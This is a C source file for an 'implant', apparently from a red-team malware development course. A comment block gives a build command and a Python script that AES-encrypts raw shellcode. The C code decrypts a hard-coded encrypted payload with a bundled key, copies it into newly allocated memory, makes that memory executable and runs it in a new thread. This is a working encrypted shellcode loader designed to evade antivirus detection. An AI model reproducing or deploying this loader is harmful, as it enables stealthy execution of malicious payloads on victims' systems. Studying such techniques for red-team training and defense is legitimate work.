/*

Based on RTO Course from Sektor 7 Institute. 

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta
	https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptographic-provider-types
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash
	https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-crypthashdata
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt




@ECHO OFF

cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

python AES'er from Sektor7 RTO Course

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')


*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                printf("\failed to acquire context");
				return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
				printf("\failed to create hash");
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
				printf("\failed to crypt hash data");
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
				printf("\failed to derive key");
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
				printf("\failed to decrypt");
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

char key[] = { 0xe5, 0x66, 0x24, 0x89, 0x2a, 0xe5, 0x89, 0xef, 0x17, 0x19, 0x9e, 0x73, 0x30, 0x58, 0x42, 0x4e };
unsigned char buf[] = { 0xdb, 0xf7, 0xdb, 0x14, 0x0, 0xb0, 0x34, 0xf6, 0x6, 0xa9, 0xba, 0x4a, 0xb0, 0xd4, 0xe5, 0x65, 0x94, 0xe4, 0x4d, 0x4d, 0x37, 0x19, 0xf4, 0x20, 0xd, 0x51, 0x9b, 0xa2, 0x36, 0xd8, 0x5, 0xcb, 0xf6, 0xed, 0x90, 0x43, 0xd9, 0xf, 0x6d, 0x1b, 0xdf, 0x95, 0x4b, 0x93, 0x8f, 0xbc, 0x1a, 0xf5, 0x8a, 0x90, 0x20, 0x85, 0xbe, 0xe, 0x9e, 0xb7, 0xd9, 0x45, 0x61, 0x53, 0x8d, 0xfc, 0x25, 0x68, 0x40, 0x79, 0x24, 0xaa, 0x5d, 0xe5, 0xaa, 0xcc, 0x66, 0xdd, 0x87, 0xe3, 0x3c, 0x99, 0xbe, 0x4, 0x7e, 0x91, 0xe9, 0xef, 0x9, 0x86, 0x2d, 0xd4, 0x64, 0x56, 0xd5, 0x5a, 0x9c, 0x3e, 0x1a, 0x24, 0x69, 0xd0, 0x7c, 0xba, 0x45, 0xb6, 0xae, 0x66, 0xad, 0x84, 0x28, 0x3, 0xab, 0xa1, 0x59, 0xea, 0xa, 0x62, 0x83, 0x5, 0xd8, 0x46, 0x21, 0xfd, 0x41, 0x1f, 0xae, 0x1c, 0x7, 0xdf, 0x72, 0x8e, 0x37, 0x96, 0xf9, 0x4b, 0xbd, 0xdf, 0x3f, 0x18, 0x37, 0x4b, 0x43, 0x97, 0x94, 0xc2, 0x8d, 0x6, 0x79, 0x2f, 0x47, 0x6, 0xb8, 0x14, 0x27, 0xe5, 0x94, 0x62, 0xd7, 0x4, 0x7e, 0x3d, 0x26, 0x90, 0xba, 0x4b, 0x27, 0x91, 0x92, 0x0, 0xda, 0x59, 0xf4, 0x13, 0xce, 0x54, 0xdf, 0x8, 0xf8, 0x76, 0xd8, 0xfb, 0x9e, 0x4a, 0x45, 0xc8, 0x14, 0xa1, 0xc, 0x97, 0x1f, 0x3a, 0x10, 0xdf, 0x33, 0xf4, 0xf4, 0x36, 0x99, 0x6f, 0xba, 0x9d, 0xb7, 0xf2, 0xd3, 0xb9, 0x70, 0x39, 0xcf, 0x71, 0x1f, 0xe0, 0xbe, 0x33, 0x4f, 0x7, 0x7c, 0x5e, 0x81, 0x55, 0xfd, 0x6, 0x2, 0x97, 0x2d, 0xce, 0x6c, 0x1d, 0x95, 0x8e, 0xaa, 0x96, 0x90, 0xc3, 0x63, 0x24, 0x88, 0x7e, 0x81, 0x61, 0xb9, 0x77, 0x95, 0xc8, 0x2f, 0x6c, 0xc4, 0xb6, 0x92, 0xa6, 0x9a, 0x5d, 0xc8, 0x7a, 0x1e, 0x40, 0x32, 0x99, 0x62, 0x1b, 0xdb, 0xba, 0xed, 0x31, 0x5b, 0x10, 0x43, 0x6c, 0xab, 0xe0, 0x6d, 0x18, 0x1c, 0x16, 0x26, 0xd4, 0xa3, 0x3c, 0xb8, 0x94, 0xa7, 0x11, 0x1a, 0x96, 0x5f, 0x75, 0xdd, 0x4c, 0x9c, 0xce, 0x45, 0x95 };
unsigned int buf_length = sizeof(buf);

int wmain(void){

LPVOID exec_payload;
BOOL vp;
PDWORD lpflOldProtect = 0;
HANDLE new_thread;


printf("\nsize of payload is: %d\n", buf_length);


exec_payload = VirtualAlloc(0, buf_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

if (exec_payload != NULL) {
    printf("\ngood call to VirtualAlloc\n");
} else {
    printf("\nVirtual Alloc didnt work :/ \n");
    exit(-1);
};

printf("%-20s : 0x%-016p\n", "payload addr", (void *)buf);
printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_payload);

printf("\nDebug Breakpoint 1! Pre Decrypt\n");
getchar();

AESDecrypt((char *) buf, buf_length, (char *)key, sizeof(key));


RtlMoveMemory(exec_payload,buf,buf_length);
printf("\nMem Moved...\n");


vp = VirtualProtect(exec_payload, buf_length, PAGE_EXECUTE_READ, &lpflOldProtect);

if (vp == 0){
    printf("\nfailed to virtualprotect\n");
    exit(-1);
} else {
    printf("\nvirtual protect g2g\n");



printf("\nDebug Breakpoint 2! Post Decrypt\n");
getchar();    

    new_thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_payload, 0,0,0);
    if (new_thread == NULL){
        printf("\nCreateThread failed :/ \n");
        exit(-1);
    } else {
    printf("\nCreateThread worked!\n");
    WaitForSingleObject(new_thread, -1);
}

};
};